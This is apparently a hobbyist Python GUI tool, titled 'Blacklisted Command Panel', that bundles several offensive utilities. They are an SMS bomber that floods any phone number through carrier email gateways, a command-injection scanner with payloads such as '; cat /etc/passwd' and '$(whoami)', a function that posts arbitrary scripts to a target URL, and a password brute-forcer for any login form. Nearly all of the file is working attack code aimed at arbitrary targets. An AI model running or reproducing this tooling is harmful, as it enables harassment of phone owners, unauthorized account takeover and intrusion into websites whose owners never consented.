import tkinter as tk
from tkinter import messagebox, scrolledtext
import smtplib
from email.mime.text import MIMEText
import time
import threading
import requests


gateway_map = {
    'att': '@txt.att.net',
    'verizon': '@vtext.com',
    'tmobile': '@tmomail.net',
    'sprint': '@messaging.sprintpcs.com',
}


code_payloads = [
    "'; whoami; #",
    "\"; whoami; #",
    "$(whoami)",
    "`whoami`",
    "; cat /etc/passwd",
    "{{7*7}}",  
]

def clean_ascii(text):
    return text.encode('ascii', errors='ignore').decode()

def send_sms(phone, provider, display_name, email, password, count, delay, message, output_box):
    phone = clean_ascii(phone.strip())
    provider = clean_ascii(provider.strip().lower())
    display_name = clean_ascii(display_name.strip())
    email = clean_ascii(email.strip())
    password = clean_ascii(password.strip())
    message = clean_ascii(message.strip())

    if provider not in gateway_map:
        output_box.insert(tk.END, f"[!] Unsupported provider '{provider}'. Supported: att, verizon, tmobile, sprint.\n")
        return

    sms_gateway = f"{phone}{gateway_map[provider]}"
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email, password)

            for i in range(count):
                msg = MIMEText(message, _charset='utf-8')
                msg['From'] = f"{display_name} <{email}>"
                msg['To'] = sms_gateway
                msg['Subject'] = "(SMS)"

                server.sendmail(email, sms_gateway, msg.as_string())
                output_box.insert(tk.END, f"[+] Sent message {i+1}/{count}. Waiting {delay}s...\n")
                output_box.see(tk.END)
                time.sleep(delay)

        output_box.insert(tk.END, "[✓] All messages sent.\n")

    except Exception as e:
        output_box.insert(tk.END, f"[!] Failed to send messages: {e}\n")
        output_box.see(tk.END)

def start_sms_thread(phone, provider, display_name, email, password, count, delay, message, output_box):
    try:
        count = int(count)
        delay = int(delay)
        if count <= 0 or delay < 0:
            raise ValueError
    except ValueError:
        output_box.insert(tk.END, "[!] Count must be > 0 and delay must be >= 0.\n")
        return

    threading.Thread(
        target=send_sms,
        args=(phone, provider, display_name, email, password, count, delay, message, output_box),
        daemon=True
    ).start()

def open_sms_window():
    sms_win = tk.Toplevel(bg='black')
    sms_win.title("Python SMS Sender")
    sms_win.geometry("600x700")

    entries = {}

    def add_labeled_entry(label_text, key, show=None):
        tk.Label(sms_win, text=label_text, fg='white', bg='black', font=('Arial', 10)).pack()
        entry = tk.Entry(sms_win, width=40, show=show, bg='white', fg='black')
        entry.pack(pady=3)
        entries[key] = entry

    add_labeled_entry("Phone Number:", "phone")
    add_labeled_entry("Carrier (att, verizon, tmobile, sprint):", "provider")
    add_labeled_entry("Display Name:", "name")
    add_labeled_entry("Your Email (Gmail):", "email")
    add_labeled_entry("App Password:", "password", show="*")
    add_labeled_entry("How many times to send?", "count")
    add_labeled_entry("Delay between messages (seconds):", "delay")

    tk.Label(sms_win, text="Message to Send:", fg='white', bg='black', font=('Arial', 10)).pack()
    message_text = tk.Text(sms_win, height=4, width=50, bg='white', fg='black')
    message_text.pack(pady=5)

    terminal_output = scrolledtext.ScrolledText(sms_win, height=15, width=70, bg='white', fg='black', insertbackground='black')
    terminal_output.pack(pady=10)

    tk.Button(
        sms_win,
        text="Send SMS",
        bg='red', fg='white',
        command=lambda: start_sms_thread(
            entries["phone"].get(),
            entries["provider"].get(),
            entries["name"].get(),
            entries["email"].get(),
            entries["password"].get(),
            entries["count"].get(),
            entries["delay"].get(),
            message_text.get("1.0", tk.END),
            terminal_output
        )
    ).pack(pady=10)

def run_code_scan(url, param, output_box):
    output_box.delete("1.0", tk.END)
    if not url or not param:
        output_box.insert(tk.END, "⚠️ Please enter both URL and parameter name.\n")
        return
    output_box.insert(tk.END, f"[•] Scanning {url} with param '{param}'...\n\n")
    for payload in code_payloads:
        try:
            res = requests.post(url, data={param: payload}, timeout=5)
            suspicious = any(w in res.text.lower() for w in ["root", "uid", "etc/passwd", "7x7"])
            output_box.insert(tk.END, f"[Payload] {payload}\n")
            output_box.insert(tk.END, f"→ Status: {res.status_code}\n")
            if suspicious:
                output_box.insert(tk.END, "⚠️ Possible vulnerability detected!\n\n", "alert")
            else:
                output_box.insert(tk.END, "No signs of vulnerability.\n\n")
        except Exception as e:
            output_box.insert(tk.END, f"Error with payload '{payload}': {e}\n")

def send_custom_script(url, param, script, output_box):
    output_box.delete("1.0", tk.END)
    try:
        res = requests.post(url, data={param: script}, timeout=5)
        output_box.insert(tk.END, f"[•] Script sent to {url}\n")
        output_box.insert(tk.END, f"→ Status: {res.status_code}\n")
        output_box.insert(tk.END, f"→ Response Preview:\n{res.text[:300]}\n")
    except Exception as e:
        output_box.insert(tk.END, f"[!] Error: {e}\n")

def open_web_tools():
    web_win = tk.Toplevel(bg='black')
    web_win.title("Web Vulnerability Tools")
    web_win.geometry("650x750")

    tk.Label(web_win, text="Target URL:", fg='white', bg='black').pack()
    url_entry = tk.Entry(web_win, width=70, bg='white', fg='black')
    url_entry.pack(pady=3)

    tk.Label(web_win, text="Parameter Name:", fg='white', bg='black').pack()
    param_entry = tk.Entry(web_win, width=30, bg='white', fg='black')
    param_entry.pack(pady=3)

    tk.Label(web_win, text="Custom Script / Payload:", fg='white', bg='black').pack()
    script_input = tk.Text(web_win, height=4, width=70, bg='white', fg='black')
    script_input.pack(pady=3)

    output_box = scrolledtext.ScrolledText(web_win, height=20, width=80, bg='white', fg='black', insertbackground='black')
    output_box.pack(pady=10)
    output_box.tag_config("alert", foreground="red")

    tk.Button(web_win, text="Scan for Code Injection", bg='red', fg='white',
              command=lambda: run_code_scan(url_entry.get(), param_entry.get(), output_box)).pack(pady=5)

    tk.Button(web_win, text="Send Custom Script", bg='darkblue', fg='white',
              command=lambda: send_custom_script(url_entry.get(), param_entry.get(), script_input.get("1.0", tk.END), output_box)).pack(pady=5)

def open_brute_force_tester():
    brute_win = tk.Toplevel(bg='black')
    brute_win.title("Login Brute-Force Tester")
    brute_win.geometry("600x750")

    tk.Label(brute_win, text="Login URL:", fg='white', bg='black').pack()
    url_entry = tk.Entry(brute_win, width=70, bg='white', fg='black')
    url_entry.pack(pady=3)

    tk.Label(brute_win, text="Username Field Name:", fg='white', bg='black').pack()
    user_field = tk.Entry(brute_win, width=40, bg='white', fg='black')
    user_field.pack(pady=3)

    tk.Label(brute_win, text="Password Field Name:", fg='white', bg='black').pack()
    pass_field = tk.Entry(brute_win, width=40, bg='white', fg='black')
    pass_field.pack(pady=3)

    tk.Label(brute_win, text="Username:", fg='white', bg='black').pack()
    username_entry = tk.Entry(brute_win, width=40, bg='white', fg='black')
    username_entry.pack(pady=3)

    tk.Label(brute_win, text="Passwords to Try (one per line):", fg='white', bg='black').pack()
    pass_text = tk.Text(brute_win, height=8, width=60, bg='white', fg='black')
    pass_text.pack(pady=3)

    output_box = scrolledtext.ScrolledText(brute_win, height=20, width=80, bg='white', fg='black', insertbackground='black')
    output_box.pack(pady=10)
    output_box.tag_config("success", foreground="green")
    output_box.tag_config("fail", foreground="red")

    def run_brute_force():
        output_box.delete("1.0", tk.END)
        url = url_entry.get().strip()
        ufield = user_field.get().strip()
        pfield = pass_field.get().strip()
        uname = username_entry.get().strip()
        passwords = pass_text.get("1.0", tk.END).strip().splitlines()

        if not all([url, ufield, pfield, uname, passwords]):
            output_box.insert(tk.END, "[!] Fill in all fields.\n", "fail")
            return

        output_box.insert(tk.END, f"[•] Starting brute-force on {url}...\n")
        for pw in passwords:
            try:
                data = {ufield: uname, pfield: pw}
                res = requests.post(url, data=data, timeout=5)
                if "incorrect" in res.text.lower() or res.status_code != 200:
                    output_box.insert(tk.END, f"[✗] Tried password: {pw}\n", "fail")
                else:
                    output_box.insert(tk.END, f"[✓] Success with password: {pw}\n", "success")
                    break
            except Exception as e:
                output_box.insert(tk.END, f"[!] Error: {e}\n", "fail")
        output_box.insert(tk.END, "Brute-force complete.\n")

    tk.Button(brute_win, text="Start Brute-Force", bg='red', fg='white', command=run_brute_force).pack(pady=10)

def open_ip_tracking():
    messagebox.showinfo("IP Tracking", "IP tracking feature not implemented yet.")

def show_credits():
    credits_text = (
        "                      == Credits ==\n"
        "Main Developer: mac_cheesecoder (Discord)\n"
        "Contributor: zegamerttv (Discord)\n\n"
        "GitHub - https://github.com/mac-cheesecoder"
    )
    messagebox.showinfo("Credits", credits_text)

def main():
    root = tk.Tk()
    root.title("Blacklisted Command Panel")
    root.geometry("500x580")
    root.configure(bg='black')
    root.resizable(False, False)

    tk.Label(root, text="Blacklisted 🚫", font=("Helvetica", 24, "bold"), fg='red', bg='black').pack(pady=20)

    def styled_button(text, command):
        return tk.Button(
            root, text=text, command=command,
            width=30, bg='red', fg='white', font=('Arial', 12), relief='raised', bd=3
        )

    styled_button("1. IP Tracking", open_ip_tracking).pack(pady=10)
    styled_button("2. Python SMS", open_sms_window).pack(pady=10)
    styled_button("3. Web Vulnerability Tools", open_web_tools).pack(pady=10)
    styled_button("4. Credits", show_credits).pack(pady=10)
    styled_button("4. Brute-Force Tester", open_brute_force_tester).pack(pady=10)


    def confirm_exit():
        answer = messagebox.askyesno(
            "Confirm Exit",
            "Are you sure you want to close the Blacklisted Command Panel?\nAll running scripts will be disabled."
        )
        if answer:
            root.destroy()

    styled_button("5. Exit", confirm_exit).pack(pady=30)

    root.mainloop()

if __name__ == "__main__":
    main()
